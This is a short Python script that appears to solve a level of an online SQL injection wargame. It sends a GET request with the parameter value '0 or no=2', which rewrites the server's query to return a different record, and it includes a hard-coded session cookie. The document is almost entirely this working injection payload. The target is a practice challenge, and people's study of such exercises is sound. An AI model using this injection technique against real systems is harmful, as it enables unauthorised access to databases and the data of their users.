import requests

url = "http://los.rubiya.kr/goblin_e5afb87a6716708e3af46a849517afdc.php"

params = {
    "no":"0 or no=2"
}

headers = {
    "Cookie": "PHPSESSID=vaiqsfrlsquaoq5sr1pdt5a1u2"
}
res = requests.get(url, headers=headers, params=params)

print res.content